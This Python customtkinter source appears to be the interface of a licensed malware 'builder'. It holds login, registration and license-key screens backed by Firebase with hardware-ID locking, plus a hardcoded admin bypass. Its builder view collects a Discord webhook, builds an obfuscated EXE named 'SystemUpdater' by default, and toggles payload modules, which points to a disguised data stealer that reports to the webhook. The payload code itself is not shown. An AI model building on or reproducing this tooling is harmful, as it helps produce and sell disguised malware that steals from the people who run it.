        ctk.CTkFrame(panel, fg_color=Theme.BORDER_HI, height=1, width=230).pack(
            anchor="w", pady=16)
        ctk.CTkLabel(panel, text=t("app_tagline"), font=FONT_BODY,
                     text_color=Theme.TEXT_DIM, justify="left").pack(anchor="w")

        chips = ctk.CTkFrame(panel, fg_color="transparent")
        chips.pack(anchor="w", pady=(18, 0))
        for text, color in ((t("chip_locked"), Theme.GREEN),
                            (t("chip_sync"), Theme.PURPLE), ("v" + VERSION, Theme.AMBER)):
            ctk.CTkLabel(chips, text=f" {text} ", font=FONT_TINY, text_color=color,
                         fg_color=Theme.BG_CARD, corner_radius=6).pack(side="left", padx=(0, 6))

        hwid_box = ctk.CTkFrame(panel, fg_color=Theme.BG_CARD, corner_radius=10,
                                border_width=1, border_color=Theme.BORDER)
        hwid_box.pack(anchor="w", pady=(22, 0), fill="x")
        ctk.CTkLabel(hwid_box, text=t("hwid_this"), font=FONT_LABEL,
                     text_color=Theme.TEXT_MUTE).pack(anchor="w", padx=12, pady=(9, 0))
        ctk.CTkLabel(hwid_box, text=self.hwid, font=FONT_MONO,
                     text_color=Theme.CYAN).pack(anchor="w", padx=12, pady=(0, 10))
        return panel

    def _auth_card(self, parent, width=450):
        card = ctk.CTkFrame(parent, fg_color=Theme.BG_PANEL, corner_radius=18,
                            border_width=1, border_color=Theme.BORDER_HI, width=width)
        card.place(relx=0.725, rely=0.5, anchor="center")
        return card

    def _back_link(self, parent, command):
        back = ctk.CTkLabel(parent, text=t("back_home"), font=FONT_LABEL,
                            text_color=Theme.TEXT_MUTE, cursor="hand2", anchor="w")
        back.pack(anchor="w", pady=(0, 8))
        back.bind("<Button-1>", lambda e: command())
        back.bind("<Enter>", lambda e: back.configure(text_color=Theme.CYAN))
        back.bind("<Leave>", lambda e: back.configure(text_color=Theme.TEXT_MUTE))
        return back

    def _lang_row(self, parent):
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", pady=(14, 0))
        ctk.CTkLabel(row, text=t("language"), font=FONT_LABEL,
                     text_color=Theme.TEXT_MUTE).pack(side="left")
        LangToggle(row, Lang.code, self.set_lang).pack(side="right")
        return row

    def show_welcome(self, notice="", offline=False):
        self.clear()
        self._auth_ctx = {"screen": "welcome", "prefill": "", "notice": notice}
        self._set_auth_geometry()
        shell = self._auth_shell()
        self._brand_panel(shell)

        card = self._auth_card(shell, width=450)
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="both", expand=True, padx=32, pady=30)

        ctk.CTkLabel(inner, text=t("welcome_title"), font=("Segoe UI Semibold", 21, "bold"),
                     text_color=Theme.CYAN).pack(anchor="w")
        ctk.CTkLabel(inner, text=t("welcome_sub"), font=FONT_SMALL,
                     text_color=Theme.TEXT_MUTE, justify="left").pack(anchor="w", pady=(4, 16))

        remembered = (self.store.session.get("username", "") or "").strip()
        if remembered:
            box = ctk.CTkFrame(inner, fg_color=Theme.BG_CARD, corner_radius=10,
                               border_width=1, border_color=Theme.GREEN_DIM)
            box.pack(fill="x", pady=(0, 14))
            ctk.CTkLabel(box, text=t("last_session"), font=FONT_LABEL,
                         text_color=Theme.TEXT_MUTE).pack(anchor="w", padx=12, pady=(8, 0))
            ctk.CTkLabel(box, text=remembered, font=("Segoe UI Semibold", 13, "bold"),
                         text_color=Theme.GREEN).pack(anchor="w", padx=12, pady=(0, 10))

        GlowButton(inner, t("btn_login"), Theme.MAGENTA, "#ff6ae4", Theme.MAGENTA_DIM,
                   lambda: self.show_login(prefill=remembered), height=54,
                   font=("Segoe UI Semibold", 15, "bold")).pack(fill="x", pady=(0, 10))
        GlowButton(inner, t("btn_register"), Theme.CYAN, "#6cf2ff", Theme.CYAN_DIM,
                   lambda: self.show_register(), height=54,
                   font=("Segoe UI Semibold", 15, "bold")).pack(fill="x", pady=(0, 12))

        ctk.CTkFrame(inner, fg_color=Theme.BORDER, height=1).pack(fill="x", pady=(0, 10))

        status_row = ctk.CTkFrame(inner, fg_color="transparent")
        status_row.pack(fill="x")
        dot = ctk.CTkLabel(status_row, text="●", font=("Segoe UI", 12),
                           text_color=Theme.RED if offline else Theme.AMBER)
        dot.pack(side="left", padx=(0, 6))
        status_text = ctk.CTkLabel(
            status_row,
            text=notice or (t("conn_offline") if offline else t("conn_checking")),
            font=FONT_TINY, text_color=Theme.RED if offline else Theme.TEXT_MUTE)
        status_text.pack(side="left")

        self._lang_row(inner)

        if not offline:
            def check():
                try:
                    self.firebase.is_maintenance()

                    def ok():
                        try:
                            dot.configure(text_color=Theme.GREEN)
                            status_text.configure(text=notice or t("conn_online"),
                                                  text_color=Theme.AMBER if notice else Theme.GREEN)
                        except Exception:
                            pass
                    self.after(0, ok)
                except FirebaseError:
                    def ko():
                        try:
                            dot.configure(text_color=Theme.RED)
                            status_text.configure(text=t("conn_offline"), text_color=Theme.RED)
                        except Exception:
                            pass
                    self.after(0, ko)

            threading.Thread(target=check, daemon=True).start()

        self.bind("<Return>", lambda e: self.show_login(prefill=remembered))

    def show_register(self, notice=""):
        self.clear()
        self._auth_ctx = {"screen": "register", "prefill": "", "notice": notice}
        self._set_auth_geometry()
        shell = self._auth_shell()
        self._brand_panel(shell)

        card = self._auth_card(shell, width=450)
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="both", expand=True, padx=32, pady=22)

        self._back_link(inner, self.show_welcome)
        ctk.CTkLabel(inner, text=t("register_title"), font=("Segoe UI Semibold", 21, "bold"),
                     text_color=Theme.CYAN).pack(anchor="w")
        ctk.CTkLabel(inner, text=t("register_sub"), font=FONT_SMALL,
                     text_color=Theme.TEXT_MUTE, justify="left").pack(anchor="w", pady=(4, 14))

        FieldLabel(inner, t("f_username")).pack(anchor="w")
        self.reg_user = NeonEntry(inner, t("ph_username"))
        self.reg_user.pack(fill="x", pady=(4, 9))

        FieldLabel(inner, t("f_password")).pack(anchor="w")
        self.reg_pass = NeonEntry(inner, t("ph_password"), show="•")
        self.reg_pass.pack(fill="x", pady=(4, 9))

        FieldLabel(inner, t("f_confirm")).pack(anchor="w")
        self.reg_pass2 = NeonEntry(inner, t("ph_confirm"), show="•")
        self.reg_pass2.pack(fill="x", pady=(4, 5))

        self.match_label = ctk.CTkLabel(inner, text="", font=FONT_TINY,
                                        text_color=Theme.TEXT_MUTE, anchor="w")
        self.match_label.pack(anchor="w", pady=(0, 6))

        show_row = ctk.CTkFrame(inner, fg_color="transparent")
        show_row.pack(fill="x", pady=(0, 8))
        self.reg_show_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(show_row, text=t("show_pass"), variable=self.reg_show_var,
                        command=self._toggle_reg_pass, font=FONT_TINY,
                        fg_color=Theme.PURPLE, hover_color=Theme.CYAN,
                        checkmark_color="#04060d", text_color=Theme.TEXT_MUTE,
                        border_color=Theme.BORDER, corner_radius=5,
                        checkbox_width=16, checkbox_height=16).pack(side="left")

        FieldLabel(inner, t("f_license")).pack(anchor="w")
        self.reg_lic = NeonEntry(inner, t("ph_license"))
        self.reg_lic.pack(fill="x", pady=(4, 5))

        self.reg_error = ctk.CTkLabel(inner, text=notice, font=FONT_SMALL,
                                      text_color=Theme.AMBER if notice else Theme.RED,
                                      wraplength=380, justify="left", anchor="w")
        self.reg_error.pack(anchor="w", pady=(2, 0))

        self.reg_btn = GlowButton(inner, t("btn_create"), Theme.CYAN, "#6cf2ff",
                                  Theme.CYAN_DIM, self.do_register, height=48)
        self.reg_btn.pack(fill="x", pady=(14, 8))

        foot = ctk.CTkFrame(inner, fg_color="transparent")
        foot.pack(fill="x")
        ctk.CTkLabel(foot, text=t("have_account"), font=FONT_SMALL,
                     text_color=Theme.TEXT_MUTE).pack(side="left")
        link = ctk.CTkLabel(foot, text=t("go_login"), font=FONT_LABEL,
                            text_color=Theme.MAGENTA, cursor="hand2")
        link.pack(side="left")
        link.bind("<Button-1>", lambda e: self.show_login())

        self._lang_row(inner)
        self.reg_user.focus_set()
        for widget, nxt in ((self.reg_user, self.reg_pass),
                            (self.reg_pass, self.reg_pass2),
                            (self.reg_pass2, self.reg_lic)):
            widget.bind("<Return>", lambda e, n=nxt: n.focus_set())
        self.reg_lic.bind("<Return>", lambda e: self.do_register())
        self.reg_pass2.bind("<KeyRelease>", lambda e: self._check_match())
        self.bind("<Escape>", lambda e: self.show_welcome())

    def _toggle_reg_pass(self):
        show = "" if self.reg_show_var.get() else "•"
        self.reg_pass.configure(show=show)
        self.reg_pass2.configure(show=show)

    def _check_match(self):
        try:
            p1 = self.reg_pass.get()
            p2 = self.reg_pass2.get()
            if not p2:
                self.match_label.configure(text="", text_color=Theme.TEXT_MUTE)
            elif p1 == p2:
                self.match_label.configure(text=t("match_ok"), text_color=Theme.GREEN)
            else:
                self.match_label.configure(text=t("match_bad"), text_color=Theme.RED)
        except Exception:
            pass

    def do_register(self):
        if self.busy:
            return
        username = self.reg_user.get().strip()
        password = self.reg_pass.get()
        confirm = self.reg_pass2.get()
        license_key = self.reg_lic.get().strip().upper()

        def fail(msg, color=Theme.RED):
            try:
                self.reg_error.configure(text=msg, text_color=color)
            except Exception:
                pass

        if not username:
            return fail(t("err_user_empty"))
        if not USERNAME_RE.match(username):
            return fail(t("err_user_invalid"))
        if len(password) < 4:
            return fail(t("err_pass_short"))
        if password != confirm:
            return fail(t("err_pass_mismatch"))
        if not license_key:
            return fail(t("err_lic_empty"))
        if len(license_key) < 4:
            return fail(t("err_lic_short"))

        self.busy = True
        self.reg_btn.set_enabled(False)
        self.reg_btn.set_text(t("checking"))
        fail(t("contacting"), Theme.TEXT_DIM)

        def worker():
            try:
                if self.firebase.get_user(username):
                    return self.after(0, lambda: self._register_done(
                        False, t("err_exists", u=username)))
                lic = self.firebase.get_license(license_key)
                if lic is None:
                    return self.after(0, lambda: self._register_done(False, t("err_no_lic")))
                if lic is False:
                    return self.after(0, lambda: self._register_done(False, t("err_lic_revoked")))

                ltype = "lifetime"
                duration = None
                if isinstance(lic, dict):
                    if lic.get("banned"):
                        return self.after(0, lambda: self._register_done(False, t("err_lic_banned")))
                    if lic.get("used") and str(lic.get("user", "")).lower() != username.lower():
                        return self.after(0, lambda: self._register_done(
                            False, t("err_lic_used", u=lic.get("user"))))
                    ltype = lic.get("type", "lifetime")
                    duration = lic.get("duration_days")
                    if ltype != "lifetime" and duration and is_expired(lic.get("expires")):
                        return self.after(0, lambda: self._register_done(
                            False, t("err_lic_expired")))

                expires = None
                if ltype != "lifetime" and duration:
                    expires = (datetime.now() + timedelta(days=int(duration))).strftime(DATE_FMT)

                record = {"username": username, "password": hash_password(username, password),
                          "hwid": self.hwid, "license": license_key, "banned": False,
                          "license_type": ltype, "license_expires": expires,
                          "created": now_iso(), "last_login": now_iso()}
                self.firebase.create_user(username, record)
                self.firebase.bind_license(license_key, {
                    "used": True, "banned": False, "user": username,
                    "hwid": self.hwid, "activated": now_iso(),
                    "type": ltype, "duration_days": duration, "expires": expires})
                self.after(0, lambda: self._register_done(True, username))
            except FirebaseError as e:
                self.after(0, lambda: self._register_done(False, str(e)))
            except Exception as e:
                self.after(0, lambda: self._register_done(False, f"{t('err_unexpected')}: {e}"))

        threading.Thread(target=worker, daemon=True).start()

    def _register_done(self, ok, payload):
        self.busy = False
        try:
            self.reg_btn.set_enabled(True)
            self.reg_btn.set_text(t("btn_create"))
        except Exception:
            return
        if ok:
            self.show_login(prefill=payload, notice=t("account_created", u=payload))
        else:
            try:
                self.reg_error.configure(text=payload, text_color=Theme.RED)
            except Exception:
                pass

    def show_login(self, prefill="", notice=""):
        self.clear()
        self._auth_ctx = {"screen": "login", "prefill": prefill, "notice": notice}
        self._set_auth_geometry()
        shell = self._auth_shell()
        self._brand_panel(shell)

        card = self._auth_card(shell, width=450)
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="both", expand=True, padx=32, pady=22)

        self._back_link(inner, self.show_welcome)
        ctk.CTkLabel(inner, text=t("login_title"), font=("Segoe UI Semibold", 21, "bold"),
                     text_color=Theme.MAGENTA).pack(anchor="w")
        ctk.CTkLabel(inner, text=t("login_sub"), font=FONT_SMALL,
                     text_color=Theme.TEXT_MUTE, justify="left").pack(anchor="w", pady=(4, 14))

        FieldLabel(inner, t("f_username")).pack(anchor="w")
        self.log_user = NeonEntry(inner, t("ph_login_user"))
        self.log_user.pack(fill="x", pady=(4, 9))
        if prefill:
            self.log_user.insert(0, prefill)

        FieldLabel(inner, t("f_password")).pack(anchor="w")
        self.log_pass = NeonEntry(inner, t("ph_login_pass"), show="•")
        self.log_pass.pack(fill="x", pady=(4, 7))

        show_row = ctk.CTkFrame(inner, fg_color="transparent")
        show_row.pack(fill="x")
        self.show_pass_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(show_row, text=t("show_pass_s"), variable=self.show_pass_var,
                        command=self._toggle_pass, font=FONT_TINY,
                        fg_color=Theme.PURPLE, hover_color=Theme.CYAN,
                        checkmark_color="#04060d", text_color=Theme.TEXT_MUTE,
                        border_color=Theme.BORDER, corner_radius=5,
                        checkbox_width=16, checkbox_height=16).pack(side="left")

        self.log_error = ctk.CTkLabel(inner, text=notice, font=FONT_SMALL,
                                      text_color=Theme.GREEN if notice else Theme.RED,
                                      wraplength=370, justify="left", anchor="w")
        self.log_error.pack(anchor="w", pady=(9, 0))

        self.log_btn = GlowButton(inner, t("btn_enter"), Theme.MAGENTA, "#ff6ae4",
                                  Theme.MAGENTA_DIM, self.do_login, height=48)
        self.log_btn.pack(fill="x", pady=(14, 8))

        foot = ctk.CTkFrame(inner, fg_color="transparent")
        foot.pack(fill="x")
        ctk.CTkLabel(foot, text=t("no_account"), font=FONT_SMALL,
                     text_color=Theme.TEXT_MUTE).pack(side="left")
        link = ctk.CTkLabel(foot, text=t("go_register"), font=FONT_LABEL,
                            text_color=Theme.CYAN, cursor="hand2")
        link.pack(side="left")
        link.bind("<Button-1>", lambda e: self.show_register())

        ctk.CTkLabel(inner, text=t("admin_hint"), font=FONT_TINY,
                     text_color=Theme.TEXT_MUTE).pack(anchor="w", pady=(8, 0))

        self._lang_row(inner)
        if prefill:
            self.log_pass.focus_set()
        else:
            self.log_user.focus_set()
        self.log_user.bind("<Return>", lambda e: self.log_pass.focus_set())
        self.log_pass.bind("<Return>", lambda e: self.do_login())
        self.bind("<Escape>", lambda e: self.show_welcome())

    def _toggle_pass(self):
        try:
            self.log_pass.configure(show="" if self.show_pass_var.get() else "•")
        except Exception:
            pass

    def do_login(self):
        if self.busy:
            return
        username = self.log_user.get().strip()
        password = self.log_pass.get()

        def fail(msg, color=Theme.RED):
            try:
                self.log_error.configure(text=msg, text_color=color)
            except Exception:
                pass

        if not username and not password:
            return fail(t("err_fill_both"))
        if not username:
            return fail(t("err_no_user"))
        if not password:
            return fail(t("err_no_pass"))

        is_admin_creds = (username.lower() == ADMIN_USER and password == ADMIN_PASS)
        self.busy = True
        self.log_btn.set_enabled(False)
        self.log_btn.set_text(t("authenticating"))
        fail(t("verifying_admin") if is_admin_creds else t("checking_creds"), Theme.TEXT_DIM)

        def worker():
            try:
                user = self.firebase.get_user(username)
                if is_admin_creds:
                    if not user:
                        self.firebase.create_user(username, {
                            "username": username, "password": hash_password(username, password),
                            "hwid": "ANY", "license": "ADMIN", "banned": False,
                            "license_type": "lifetime", "license_expires": None,
                            "created": now_iso(), "last_login": now_iso()})
                    else:
                        patch = {"last_login": now_iso()}
                        if str(user.get("hwid", "")) != "ANY":
                            patch["hwid"] = "ANY"
                        self.firebase.patch(f"users/{username.lower()}", patch)
                    if self.store.config.get("remember", True):
                        self.store.session["username"] = username
                        self.store.session["hwid"] = self.hwid
                        self.store.save_session()
                    return self.after(0, lambda: self._login_done(True, username, True))

                if not user:
                    return self.after(0, lambda: self._login_done(
                        False, t("err_no_user_db", u=username), False))
                if str(user.get("password", "")) != hash_password(
                        user.get("username", username), password):
                    return self.after(0, lambda: self._login_done(False, t("err_bad_pass"), False))
                if user.get("banned"):
                    return self.after(0, lambda: self._login_done(
                        False, t("err_user_banned"), False))

                bound_hwid = str(user.get("hwid", "") or "")
                if bound_hwid and bound_hwid.upper() != "ANY" and bound_hwid != self.hwid:
                    return self.after(0, lambda: self._login_done(
                        False, f"{t('err_other_device')}\n{t('err_hwid_reg')}: {bound_hwid}\n"
                               f"{t('err_hwid_you')}: {self.hwid}", False))

                lic_key = str(user.get("license", "") or "")
                if lic_key and lic_key != "ADMIN":
                    lic = self.firebase.get_license(lic_key)
                    if lic is False:
                        return self.after(0, lambda: self._login_done(
                            False, t("err_lic_revoked_user"), False))
                    if isinstance(lic, dict):
                        if lic.get("banned"):
                            return self.after(0, lambda: self._login_done(
                                False, t("err_lic_banned_user"), False))
                        if is_expired(lic.get("expires")):
                            return self.after(0, lambda: self._login_done(
                                False, t("err_lic_expired"), False))
                    elif is_expired(user.get("license_expires")):
                        return self.after(0, lambda: self._login_done(
                            False, t("err_lic_expired"), False))

                if not bound_hwid:
                    self.firebase.patch(f"users/{username.lower()}", {"hwid": self.hwid})
                self.firebase.touch_login(username)
                if self.store.config.get("remember", True):
                    self.store.session["username"] = user.get("username", username)
                    self.store.session["hwid"] = self.hwid
                    self.store.save_session()
                self.after(0, lambda: self._login_done(True, user.get("username", username), False))
            except FirebaseError as e:
                self.after(0, lambda: self._login_done(False, str(e), False))
            except Exception as e:
                self.after(0, lambda: self._login_done(False, f"{t('err_unexpected')}: {e}", False))

        threading.Thread(target=worker, daemon=True).start()

    def _login_done(self, ok, payload, admin):
        self.busy = False
        try:
            self.log_btn.set_enabled(True)
            self.log_btn.set_text(t("btn_enter"))
        except Exception:
            return
        if ok:
            self.username = payload
            self.is_admin = bool(admin)
            self.show_tool()
        else:
            try:
                self.log_error.configure(text=payload, text_color=Theme.RED)
            except Exception:
                pass

    def show_maintenance(self, notice=""):
        self.clear()
        self._auth_ctx = {"screen": "maintenance", "prefill": "", "notice": notice}
        self._set_auth_geometry()
        shell = self._auth_shell()

        card = ctk.CTkFrame(shell, fg_color=Theme.BG_PANEL, corner_radius=18,
                            border_width=1, border_color=Theme.AMBER)
        card.place(relx=0.5, rely=0.5, anchor="center")
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(padx=46, pady=38)

        ctk.CTkLabel(inner, text="🛠", font=("Segoe UI", 42)).pack()
        ctk.CTkLabel(inner, text=t("maint_title"), font=("Segoe UI Semibold", 20, "bold"),
                     text_color=Theme.AMBER).pack(pady=(6, 4))
        ctk.CTkLabel(inner, text=t("maint_sub"), font=FONT_SMALL,
                     text_color=Theme.TEXT_DIM, justify="center").pack()

        self.maint_msg = ctk.CTkLabel(inner, text=notice, font=FONT_SMALL,
                                      text_color=Theme.RED, wraplength=340)
        self.maint_msg.pack(pady=(10, 0))

        row = ctk.CTkFrame(inner, fg_color="transparent")
        row.pack(pady=(20, 0))
        GlowButton(row, t("btn_retry"), Theme.AMBER, "#ffcb5c", Theme.AMBER_DIM,
                   self._retry_maintenance, height=42).pack(side="left", padx=4)
        GhostButton(row, t("btn_skip"), self.show_welcome, height=42).pack(side="left", padx=4)
        self._lang_row(inner)

    def _retry_maintenance(self):
        try:
            self.maint_msg.configure(text=t("maint_asking"), text_color=Theme.TEXT_DIM)
        except Exception:
            pass

        def worker():
            try:
                if self.firebase.is_maintenance():
                    self.after(0, lambda: self.maint_msg.configure(
                        text=t("maint_still"), text_color=Theme.AMBER))
                else:
                    self.after(0, self.show_welcome)
            except FirebaseError as e:
                self.after(0, lambda: self.maint_msg.configure(text=str(e), text_color=Theme.RED))

        threading.Thread(target=worker, daemon=True).start()

    def show_tool(self, keep_view=None):
        self.clear()
        self._auth_ctx["screen"] = "tool"
        self._set_tool_geometry()

        shell = ctk.CTkFrame(self, fg_color=Theme.BG_DEEP)
        shell.pack(fill="both", expand=True)
        shell.grid_rowconfigure(1, weight=1)
        shell.grid_columnconfigure(0, weight=1)

        self._build_topbar(shell)
        self._build_body(shell)
        self._build_statusbar(shell)
        self.load_config_into_ui()

        self._log("=" * 74)
        self._log(t("log_session", u=self.username)
                  + ("  [ADMIN]" if self.is_admin else ""), "SUCCESS")
        self._log(t("log_device", h=self.hwid))
        self._log(t("log_db", d=FIREBASE_URL))
        self._log("=" * 74)
        self._log(t("log_ready"))
        self.switch_view(keep_view or "builder")

    def _rebuild_tool(self):
        keep = self._current_view
        saved_log = ""
        try:
            saved_log = self.log_text.get("1.0", "end")
        except Exception:
            pass
        self.show_tool(keep_view=keep)
        if saved_log:
            try:
                self.log_text.delete("1.0", "end")
                self.log_text.insert("end", saved_log)
                self.log_text.see("end")
            except Exception:
                pass

    def _build_topbar(self, parent):
        bar = ctk.CTkFrame(parent, fg_color=Theme.BG_PANEL, height=70, corner_radius=0)
        bar.grid(row=0, column=0, sticky="ew")
        bar.pack_propagate(False)
        ctk.CTkFrame(bar, fg_color=Theme.AMBER if self.is_admin else Theme.CYAN,
                     height=2).pack(side="top", fill="x")

        left = ctk.CTkFrame(bar, fg_color="transparent")
        left.pack(side="left", padx=22, pady=12)
        ctk.CTkLabel(left, text="◈", font=("Segoe UI Semibold", 24, "bold"),
                     text_color=Theme.CYAN).pack(side="left", padx=(0, 12))
        titles = ctk.CTkFrame(left, fg_color="transparent")
        titles.pack(side="left")
        ctk.CTkLabel(titles, text=TOOL_NAME, font=("Segoe UI Semibold", 16, "bold"),
                     text_color=Theme.TEXT).pack(anchor="w")
        ctk.CTkLabel(titles, text=f"v{VERSION}  ·  {t('topbar_sub')}", font=FONT_TINY,
                     text_color=Theme.TEXT_MUTE).pack(anchor="w")

        right = ctk.CTkFrame(bar, fg_color="transparent")
        right.pack(side="right", padx=22, pady=12)
        if self.is_admin:
            ctk.CTkLabel(right, text=t("badge_admin"), font=FONT_LABEL,
                         text_color="#04060d", fg_color=Theme.AMBER,
                         corner_radius=6).pack(side="left", padx=(0, 10))

        user_box = ctk.CTkFrame(right, fg_color=Theme.BG_CARD, corner_radius=12,
                                border_width=1,
                                border_color=Theme.AMBER_DIM if self.is_admin else Theme.BORDER)
        user_box.pack(side="left", padx=(0, 12))
        ctk.CTkLabel(user_box, text=self.username[:1].upper(),
                     font=("Segoe UI Semibold", 14, "bold"), text_color="#04060d",
                     fg_color=Theme.AMBER if self.is_admin else Theme.CYAN,
                     corner_radius=9, width=30, height=30).pack(side="left", padx=(7, 8), pady=6)
        uinfo = ctk.CTkFrame(user_box, fg_color="transparent")
        uinfo.pack(side="left", padx=(0, 12), pady=6)
        ctk.CTkLabel(uinfo, text=self.username, font=("Segoe UI Semibold", 12),
                     text_color=Theme.TEXT).pack(anchor="w")
        ctk.CTkLabel(uinfo, text=t("sub_admin") if self.is_admin else t("sub_user"),
                     font=FONT_TINY,
                     text_color=Theme.AMBER if self.is_admin else Theme.GREEN).pack(anchor="w")

        GhostButton(right, t("btn_logout"), self.do_logout, accent=Theme.RED_DIM,
                    width=90, height=34).pack(side="left")

    def _build_body(self, parent):
        body = ctk.CTkFrame(parent, fg_color="transparent")
        body.grid(row=1, column=0, sticky="nsew", padx=14, pady=14)
        body.grid_rowconfigure(0, weight=1)
        body.grid_columnconfigure(0, weight=0)
        body.grid_columnconfigure(1, weight=1)

        side = ctk.CTkFrame(body, fg_color=Theme.BG_PANEL, corner_radius=14,
                            border_width=1, border_color=Theme.BORDER, width=214)
        side.grid(row=0, column=0, sticky="nsw", padx=(0, 14))
        side.pack_propagate(False)

        ctk.CTkLabel(side, text=t("nav_section"), font=FONT_LABEL,
                     text_color=Theme.TEXT_MUTE, anchor="w").pack(fill="x", padx=16, pady=(18, 8))
        for key, icon, label_key in self.BASE_VIEWS:
            btn = NavButton(side, icon, t(label_key), lambda k=key: self.switch_view(k))
            btn.pack(fill="x", padx=10, pady=2)
            self._nav_buttons[key] = btn

        if self.is_admin:
            ctk.CTkFrame(side, fg_color=Theme.AMBER_DIM, height=1).pack(fill="x", padx=16, pady=10)
            ctk.CTkLabel(side, text=t("admin_section"), font=FONT_LABEL,
                         text_color=Theme.AMBER, anchor="w").pack(fill="x", padx=16, pady=(0, 6))
            key, icon, label_key = self.ADMIN_VIEW
            btn = NavButton(side, icon, t(label_key), lambda k=key: self.switch_view(k))
            btn.pack(fill="x", padx=10, pady=2)
            self._nav_buttons[key] = btn

        ctk.CTkFrame(side, fg_color=Theme.BORDER, height=1).pack(fill="x", padx=16, pady=16)
        info = ctk.CTkFrame(side, fg_color="transparent")
        info.pack(fill="x", padx=16)
        for label, value, color in (("HWID", self.hwid[:23] + "…", Theme.CYAN),
                                    (t("server_label"), "Firebase", Theme.PURPLE)):
            ctk.CTkLabel(info, text=label, font=FONT_LABEL, text_color=Theme.TEXT_MUTE,
                         anchor="w").pack(fill="x")
            ctk.CTkLabel(info, text=value, font=FONT_MONO, text_color=color,
                         anchor="w").pack(fill="x", pady=(0, 12))

        GhostButton(side, "💬  DISCORD", lambda: open_url(DISCORD),
                    accent=Theme.MAGENTA_DIM).pack(fill="x", padx=16, pady=(4, 16), side="bottom")

        self.view_host = ctk.CTkFrame(body, fg_color="transparent")
        self.view_host.grid(row=0, column=1, sticky="nsew")
        self.view_host.grid_rowconfigure(0, weight=1)
        self.view_host.grid_columnconfigure(0, weight=1)

        builders = {"builder": self._view_builder, "modules": self._view_modules,
                    "options": self._view_options, "console": self._view_console}
        if self.is_admin:
            builders["admin"] = self._view_admin
        for key, factory in builders.items():
            view = factory(self.view_host)
            view.grid(row=0, column=0, sticky="nsew")
            self._views[key] = view

    def _build_statusbar(self, parent):
        bar = ctk.CTkFrame(parent, fg_color=Theme.BG_PANEL, height=34, corner_radius=0)
        bar.grid(row=2, column=0, sticky="ew")
        bar.pack_propagate(False)
        self.status_label = ctk.CTkLabel(bar, text=t("status_ready"), font=FONT_TINY,
                                         text_color=Theme.GREEN)
        self.status_label.pack(side="left", padx=18)
        ctk.CTkLabel(bar, text=f"v{VERSION}", font=FONT_TINY,
                     text_color=Theme.TEXT_MUTE).pack(side="right", padx=18)
        self.progress = ctk.CTkProgressBar(bar, width=190, height=6, corner_radius=3,
                                           progress_color=Theme.CYAN, fg_color=Theme.BG_INPUT)
        self.progress.pack(side="right", padx=10)
        self.progress.set(0)

    def _view_builder(self, parent):
        view = ctk.CTkScrollableFrame(parent, fg_color="transparent",
                                      scrollbar_button_color=Theme.PURPLE,
                                      scrollbar_button_hover_color=Theme.CYAN)
        hero = Card(view, accent=Theme.CYAN)
        hero.pack(fill="x", pady=(0, 14))
        ctk.CTkLabel(hero.body, text=t("builder_title"), font=("Segoe UI Semibold", 22, "bold"),
                     text_color=Theme.CYAN).pack(anchor="w")
        ctk.CTkLabel(hero.body, text=t("builder_sub"), font=FONT_SMALL,
                     text_color=Theme.TEXT_MUTE).pack(anchor="w", pady=(2, 16))

        FieldLabel(hero.body, t("f_webhook")).pack(anchor="w")
        self.webhook_entry = NeonEntry(hero.body, "https://discord.com/api/webhooks/…", height=46)
        self.webhook_entry.pack(fill="x", pady=(5, 14))

        row = ctk.CTkFrame(hero.body, fg_color="transparent")
        row.pack(fill="x")
        GhostButton(row, t("btn_test_webhook"), self.test_webhook,
                    accent=Theme.CYAN_DIM, height=40).pack(side="left", padx=(0, 8))
        GhostButton(row, t("btn_save"), self.save_webhook,
                    accent=Theme.PURPLE_DIM, height=40).pack(side="left")

        self.build_btn = GlowButton(view, t("btn_build"), Theme.MAGENTA, "#ff6ae4",
                                    Theme.MAGENTA_DIM, self.build_payload, height=60,
                                    font=("Segoe UI Semibold", 18, "bold"))
        self.build_btn.pack(fill="x", pady=(0, 14))

        stats = ctk.CTkFrame(view, fg_color="transparent")
        stats.pack(fill="x")
        for i in range(3):
            stats.grid_columnconfigure(i, weight=1)
        self.stat_modules = self._stat_card(stats, 0, t("stat_modules"), "0", Theme.GREEN)
        self.stat_name = self._stat_card(stats, 1, t("stat_name"), "SystemUpdater", Theme.PURPLE)
        self.stat_mode = self._stat_card(stats, 2, t("stat_mode"), "OBF + EXE", Theme.AMBER)

        tips = Card(view, t("summary_title"), Theme.BORDER_HI)
        tips.pack(fill="x", pady=(14, 0))
        self.summary_label = ctk.CTkLabel(tips.body, text="", font=FONT_MONO,
                                          text_color=Theme.TEXT_DIM, justify="left", anchor="w")
        self.summary_label.pack(fill="x")
        return view

    def _stat_card(self, parent, col, title, value, color):
        pad = (0 if col == 0 else 7, 0 if col == 2 else 7)
        card = ctk.CTkFrame(parent, fg_color=Theme.BG_CARD, corner_radius=12,
                            border_width=1, border_color=Theme.BORDER)
        card.grid(row=0, column=col, sticky="ew", padx=pad)
        ctk.CTkLabel(card, text=title, font=FONT_LABEL,
                     text_color=Theme.TEXT_MUTE).pack(anchor="w", padx=14, pady=(12, 0))
        lbl = ctk.CTkLabel(card, text=value, font=("Segoe UI Semibold", 18, "bold"),
                           text_color=color)
        lbl.pack(anchor="w", padx=14, pady=(0, 12))
        return lbl

    def _view_modules(self, parent):
        view = ctk.CTkScrollableFrame(parent, fg_color="transparent",
                                      scrollbar_button_color=Theme.MAGENTA,
                                      scrollbar_button_hover_color=Theme.CYAN)
        head = Card(view, accent=Theme.MAGENTA)
        head.pack(fill="x", pady=(0, 14))
        ctk.CTkLabel(head.body, text=t("modules_title"), font=("Segoe UI Semibold", 18, "bold"),
                     text_color=Theme.MAGENTA).pack(anchor="w")
        ctk.CTkLabel(head.body, text=t("modules_sub"), font=FONT_SMALL,
                     text_color=Theme.TEXT_MUTE).pack(anchor="w", pady=(2, 12))

        row = ctk.CTkFrame(head.body, fg_color="transparent")
        row.pack(fill="x")
        GhostButton(row, t("btn_enable_all"), self.enable_all_modules,
                    accent=Theme.GREEN_DIM, height=34).pack(side="left", padx=(0, 8))
        GhostButton(row, t("btn_disable_all"), self.disable_all_modules,
                    accent=Theme.RED_DIM, height=34).pack(side="left")

